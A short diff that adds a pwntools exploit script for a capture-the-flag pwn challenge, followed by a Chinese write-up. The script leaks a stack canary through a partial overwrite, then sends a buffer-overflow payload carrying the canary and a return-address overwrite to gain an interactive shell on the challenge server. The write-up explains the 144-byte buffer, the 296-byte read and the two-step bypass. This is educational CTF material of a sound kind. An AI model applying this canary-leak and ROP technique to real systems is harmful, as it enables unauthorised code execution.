@@ -1,0 +1,31 @@
+from pwn import *
+
+p = remote('challenge.bluesharkinfo.com', 23266)
+
+context(arch='amd64', os='linux', log_level='debug')
+
+p.sendlineafter(b'>', b'a'*0x2 + b'/bin/sh\x00')
+p.sendlineafter(b'game', b'')
+for i in range(5):
+    p.sendlineafter(b'+', b'q')
+    p.sendlineafter(b'>', b'\n')
+p.sendlineafter(b'+', b'q')
+p.sendlineafter(b'>', b'q')
+
+p.recvuntil(b'here is your shell')
+
+
+payload = b'a'*0x89
+p.sendafter(b'$', payload)
+
+p.recvuntil(b'a'*0x89)
+canary = u64(p.recv(7).rjust(8, b'\x00'))
+print(hex(canary))
+
+payload = b'a'*0x88 + p64(canary) + p64(0x404A40 + 0x98) + p64(0x40150A)
+p.sendafter(b'$', payload)
+
+p.sendafter(b'$', b'exit')
+
+p.interactive()
+在本次挑战中，程序首先要求输入用户名并进行了字符串拼接处理，随后进入一个计分游戏循环。虽然程序设定了高分（10万分）才能进入特权shell()函数，但通过分析发现可以直接快速退出游戏流程并进入shell()函数。该函数内部存在明显的栈溢出漏洞：其buf数组大小为144字节，而read函数却允许读取296字节，这导致我们可以覆盖栈上的返回地址。同时，程序开启了Canary保护机制。通过精心构造的溢出Payload，我们分两步完成了攻击：首先部分覆盖Canary并利用程序输出泄露其值，然后在第二次输入中利用泄露的Canary绕过保护，最终构造ROP链成功劫持程序执行流，获得了目标shell。
